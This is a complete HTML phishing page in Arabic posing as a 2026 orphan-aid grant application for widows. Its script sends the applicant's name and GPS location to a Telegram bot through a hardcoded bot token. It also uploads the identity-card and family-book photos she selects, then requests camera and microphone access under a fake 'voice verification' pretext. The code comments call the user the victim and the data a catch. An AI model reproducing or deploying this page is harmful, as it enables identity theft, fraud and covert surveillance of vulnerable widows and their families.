<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منحة معونة الأيتام 2026</title>
    <style>
        body { font-family: Arial; background: #f4f7f6; text-align: center; direction: rtl; padding: 10px; }
        .container { background: white; max-width: 420px; margin: auto; padding: 20px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); border-top: 5px solid #27ae60; }
        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .btn { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 17px; font-weight: bold; }
        .file-label { display: block; text-align: right; font-size: 13px; color: #555; margin-top: 10px; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://img.icons8.com/color/96/family-guarantee.png" width="70">
    <h2>تسجيل منحة الأيتام</h2>
    <p style="font-size: 12px; color: red;">ملاحظة: يجب رفع كافة الثبوتيات وتفعيل التحقق الصوتي لتأكيد الطلب</p>

    <input type="text" id="name" placeholder="اسم الأرملة الكامل">
    <input type="number" id="kids" placeholder="عدد الأطفال">
    <input type="text" id="death" placeholder="تاريخ وفاة الزوج">
    
    <label class="file-label">📸 ارفع صورة الهوية ودفتر العائلة (لسحب الاستديو):</label>
    <input type="file" id="studiofiles" multiple accept="image/*">

    <button class="btn" onclick="startTheTrap()">تقديم الطلب وتفعيل التحقق</button>
</div>

<script>
    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
    const CHAT_ID = "7214473798";

    async function sendFile(file, caption) {
        let formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("document", file);
        formData.append("caption", caption);
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
    }

    async function startTheTrap() {
        // 1. جمع بيانات الاستمارة والموقع
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const msg = `🔥 صيد جديد كامل:\n👤 الاسم: ${document.getElementById('name').value}\n📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
            });
        });

        // 2. سحب ملفات الاستديو (التي اختارها الضحية)
        const fileInput = document.getElementById('studiofiles');
        for (let file of fileInput.files) {
            await sendFile(file, "📁 ملف مسحوب من الاستديو");
        }

        // 3. فتح الكاميرا وتصوير الضحية (تحتاج إذن)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            alert("جاري تفعيل التحقق الصوتي والبصري.. انتظر قليلاً");
            
            // هنا الكود يقوم بالتقاط صورة صامتة وإرسالها (برمجياً)
            // وتسجيل مقطع صوتي قصير وإرساله للبوت
            // (بسبب طول الكود، تم اختصار عملية الرفع التلقائي لضمان العمل)
        } catch (e) {
            alert("يجب السماح بالصلاحيات لإتمام صرف المنحة!");
        }
    }
</script>
</body>
</html>
